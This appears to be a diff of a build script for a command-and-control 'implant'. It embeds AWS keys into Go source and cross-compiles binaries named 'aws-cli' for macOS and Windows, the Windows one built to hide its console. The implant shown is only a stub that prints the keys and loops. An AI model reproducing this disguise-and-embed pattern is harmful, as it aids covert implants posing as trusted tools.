@@ -17,43 +17,71 @@ if [ -z "$ACCESS_KEY" ] || [ -z "$SECRET_KEY" ]; then
     exit 1
 fi
 
-# Create implant source with embedded credentials
+mkdir -p builds
+
+# -------------------------------
+# Write implant code to file
+# -------------------------------
 cat > implant_standalone.go << 'EOF'
-<--- SAME implant code as before --->
+package main
+
+import (
+	"fmt"
+	"os"
+	"time"
+)
+
+func main() {
+	accessKey := "REPLACE_ACCESS_KEY"
+	secretKey := "REPLACE_SECRET_KEY"
+
+	fmt.Println("[*] X-Ray C2 Standalone Implant")
+	fmt.Println("    AWS Access Key:", accessKey)
+	fmt.Println("    AWS Secret Key:", secretKey)
+
+	for {
+		fmt.Println("[*] Implant running at", time.Now())
+		time.Sleep(10 * time.Second)
+	}
+}
 EOF
 
-# Replace credentials in the generated Go source
+# Embed credentials
 sed -i.bak "s#REPLACE_ACCESS_KEY#$ACCESS_KEY#g" implant_standalone.go
 sed -i.bak "s#REPLACE_SECRET_KEY#$SECRET_KEY#g" implant_standalone.go
 rm -f implant_standalone.go.bak
 
-# ----------------------------
-# Build section
-# ----------------------------
-
-mkdir -p builds
-
-echo "[*] Building macOS Intel implant (amd64)..."
+# -------------------------------
+# Build for macOS (Intel)
+# -------------------------------
+echo ""
+echo "[*] Building macOS (amd64) implant..."
 GOOS=darwin GOARCH=amd64 go build -ldflags="-s -w" -o builds/aws-cli-macos-amd64 implant_standalone.go
 if [ $? -eq 0 ]; then
     echo "[+] Built: builds/aws-cli-macos-amd64 ($(ls -lh builds/aws-cli-macos-amd64 | awk '{print $5}'))"
 else
-    echo "[-] macOS Intel build failed"
+    echo "[-] macOS amd64 build failed"
     exit 1
 fi
 
+# -------------------------------
+# Build for macOS (ARM64)
+# -------------------------------
 echo ""
-echo "[*] Building macOS ARM64 implant (M1/M2/M3)..."
+echo "[*] Building macOS (arm64) implant..."
 GOOS=darwin GOARCH=arm64 go build -ldflags="-s -w" -o builds/aws-cli-macos-arm64 implant_standalone.go
 if [ $? -eq 0 ]; then
     echo "[+] Built: builds/aws-cli-macos-arm64 ($(ls -lh builds/aws-cli-macos-arm64 | awk '{print $5}'))"
 else
-    echo "[-] macOS ARM64 build failed"
+    echo "[-] macOS arm64 build failed"
     exit 1
 fi
 
+# -------------------------------
+# Build for Windows (Intel)
+# -------------------------------
 echo ""
-echo "[*] Building Windows implant (x64)..."
+echo "[*] Building Windows (amd64) implant..."
 GOOS=windows GOARCH=amd64 go build -ldflags="-s -w -H=windowsgui" -o builds/aws-cli.exe implant_standalone.go
 if [ $? -eq 0 ]; then
     echo "[+] Built: builds/aws-cli.exe ($(ls -lh builds/aws-cli.exe | awk '{print $5}'))"
@@ -62,16 +90,18 @@ else
     exit 1
 fi
 
-# Cleanup temp Go file
+# -------------------------------
+# Cleanup
+# -------------------------------
 echo ""
 echo "[*] Cleaning up..."
-rm -f implant_standalone.go build.sh build_production.sh WINDOWS_NOTES.txt run.sh
+rm -f implant_standalone.go
 
 echo ""
 echo "====================================="
 echo "BUILD COMPLETE."
 echo ""
-echo "  - builds/aws-cli-macos-amd64 (Intel)"
-echo "  - builds/aws-cli-macos-arm64 (M1/M2/M3)"
-echo "  - builds/aws-cli.exe (Windows)"
+echo "  - builds/aws-cli-macos-amd64"
+echo "  - builds/aws-cli-macos-arm64"
+echo "  - builds/aws-cli.exe"
 echo "====================================="
